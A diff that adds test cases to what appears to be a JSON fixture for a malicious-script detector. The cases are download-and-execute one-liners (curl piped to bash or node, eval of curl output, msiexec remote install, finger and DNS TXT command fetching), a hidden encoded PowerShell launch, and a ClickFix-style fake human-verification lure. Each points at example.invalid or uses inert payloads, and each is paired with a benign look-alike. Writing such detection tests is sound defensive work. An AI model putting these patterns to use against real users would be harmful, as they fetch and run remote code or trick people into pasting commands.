@@ -440,5 +440,163 @@
     "name": "launchagent_backup.plist",
     "text": "<plist><dict><key>ProgramArguments</key><array><string>/usr/bin/python3</string><string>/Users/me/backup.py</string></array></dict></plist>",
     "expected": null
+  },
+  {
+    "name": "variant_ps_prefix_flags.cmd",
+    "text": "powershell -nop -win hid -exec bypass -enco VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAGkAbgBlAHIAdAAnAA==\r\n",
+    "expected": "script_encoded_powershell"
+  },
+  {
+    "name": "variant_ps_prefix_flags_utf16le.bin",
+    "text": "powershell -nop -win hid -exec bypass -enco VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAGkAbgBlAHIAdAAnAA==\r\n",
+    "expected": "script_encoded_powershell",
+    "encoding": "utf-16le"
+  },
+  {
+    "name": "variant_ps_prefix_flags.zip",
+    "text": "powershell -nop -win hid -exec bypass -enco VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAGkAbgBlAHIAdAAnAA==\r\n",
+    "expected": "script_encoded_powershell",
+    "container": "zip"
+  },
+  {
+    "name": "variant_ps_slash_numeric.cmd",
+    "text": "powershell /w 1 /e VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAGkAbgBlAHIAdAAnAA==\r\n",
+    "expected": "script_encoded_powershell"
+  },
+  {
+    "name": "variant_ps_slash_numeric_utf16le.bin",
+    "text": "powershell /w 1 /e VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAGkAbgBlAHIAdAAnAA==\r\n",
+    "expected": "script_encoded_powershell",
+    "encoding": "utf-16le"
+  },
+  {
+    "name": "variant_ps_window_only.cmd",
+    "text": "pwsh -w 1 -c \"Get-ChildItem\"\r\n",
+    "expected": null
+  },
+  {
+    "name": "variant_ps_window_only_utf16le.bin",
+    "text": "pwsh -w 1 -c \"Get-ChildItem\"\r\n",
+    "expected": null,
+    "encoding": "utf-16le"
+  },
+  {
+    "name": "variant_curl_path_bash.sh",
+    "text": "curl -fsSL https://example.invalid/i.sh | /bin/bash\n",
+    "expected": "script_download_execute"
+  },
+  {
+    "name": "variant_curl_path_bash_utf16le.bin",
+    "text": "curl -fsSL https://example.invalid/i.sh | /bin/bash\n",
+    "expected": "script_download_execute",
+    "encoding": "utf-16le"
+  },
+  {
+    "name": "variant_curl_path_bash.zip",
+    "text": "curl -fsSL https://example.invalid/i.sh | /bin/bash\n",
+    "expected": "script_download_execute",
+    "container": "zip"
+  },
+  {
+    "name": "variant_curl_path_shasum.sh",
+    "text": "curl -sL https://example.invalid/a.tgz | /usr/bin/shasum -a 256\n",
+    "expected": null
+  },
+  {
+    "name": "variant_curl_path_shasum_utf16le.bin",
+    "text": "curl -sL https://example.invalid/a.tgz | /usr/bin/shasum -a 256\n",
+    "expected": null,
+    "encoding": "utf-16le"
+  },
+  {
+    "name": "variant_eval_curl.sh",
+    "text": "eval \"$(curl -fsSL https://example.invalid/i.sh)\"\n",
+    "expected": "script_download_execute"
+  },
+  {
+    "name": "variant_eval_curl_utf16le.bin",
+    "text": "eval \"$(curl -fsSL https://example.invalid/i.sh)\"\n",
+    "expected": "script_download_execute",
+    "encoding": "utf-16le"
+  },
+  {
+    "name": "variant_version_assignment.sh",
+    "text": "VERSION=$(curl -s https://example.invalid/version)\n",
+    "expected": null
+  },
+  {
+    "name": "variant_curl_node.sh",
+    "text": "curl -s https://example.invalid/p.js | node\n",
+    "expected": "script_download_execute"
+  },
+  {
+    "name": "variant_curl_node_utf16le.bin",
+    "text": "curl -s https://example.invalid/p.js | node\n",
+    "expected": "script_download_execute",
+    "encoding": "utf-16le"
+  },
+  {
+    "name": "variant_curl_node_program.sh",
+    "text": "curl -s https://example.invalid/api | node parse.js\n",
+    "expected": null
+  },
+  {
+    "name": "variant_msiexec_dash.cmd",
+    "text": "msiexec -i https://example.invalid/a.msi /qn\r\n",
+    "expected": "win_lolbin_download"
+  },
+  {
+    "name": "variant_msiexec_dash_utf16le.bin",
+    "text": "msiexec -i https://example.invalid/a.msi /qn\r\n",
+    "expected": "win_lolbin_download",
+    "encoding": "utf-16le"
+  },
+  {
+    "name": "variant_finger_for_call.cmd",
+    "text": "for /f \"skip=8 delims=\" %h in ('finger inert@example.invalid') do call %h\r\n",
+    "expected": "win_lolbin_download"
+  },
+  {
+    "name": "variant_finger_for_call_utf16le.bin",
+    "text": "for /f \"skip=8 delims=\" %h in ('finger inert@example.invalid') do call %h\r\n",
+    "expected": "win_lolbin_download",
+    "encoding": "utf-16le"
+  },
+  {
+    "name": "variant_finger_for_echo.cmd",
+    "text": "for /f \"delims=\" %h in ('finger alice@example.invalid') do echo %h\r\n",
+    "expected": null
+  },
+  {
+    "name": "variant_dns_txt_iex.cmd",
+    "text": "powershell -c \"iex((Resolve-DnsName -Type TXT example.invalid).Strings)\"\r\n",
+    "expected": "script_download_execute"
+  },
+  {
+    "name": "variant_dns_txt_iex_utf16le.bin",
+    "text": "powershell -c \"iex((Resolve-DnsName -Type TXT example.invalid).Strings)\"\r\n",
+    "expected": "script_download_execute",
+    "encoding": "utf-16le"
+  },
+  {
+    "name": "variant_dns_lookup_only.cmd",
+    "text": "Resolve-DnsName -Type TXT example.invalid | Select-Object Strings\r\n",
+    "expected": null
+  },
+  {
+    "name": "variant_clickfix_macos.html",
+    "text": "<h1>Verify you're human</h1><p>Press <kbd>Command</kbd> + <kbd>Space</kbd>, type Terminal, then press <kbd>Command</kbd> + <kbd>V</kbd>.</p><script>navigator.clipboard.writeText('INERT');</script>",
+    "expected": "web_clickfix_lure"
+  },
+  {
+    "name": "variant_clickfix_macos_utf16le.bin",
+    "text": "<h1>Verify you're human</h1><p>Press <kbd>Command</kbd> + <kbd>Space</kbd>, type Terminal, then press <kbd>Command</kbd> + <kbd>V</kbd>.</p><script>navigator.clipboard.writeText('INERT');</script>",
+    "expected": "web_clickfix_lure",
+    "encoding": "utf-16le"
+  },
+  {
+    "name": "variant_shortcut_help.html",
+    "text": "<h1>Keyboard shortcuts</h1><p>Press <kbd>Cmd</kbd> + <kbd>V</kbd> to paste and <kbd>Cmd</kbd> + <kbd>Space</kbd> for Spotlight.</p><script>navigator.clipboard.writeText(x);</script>",
+    "expected": null
   }
 ]
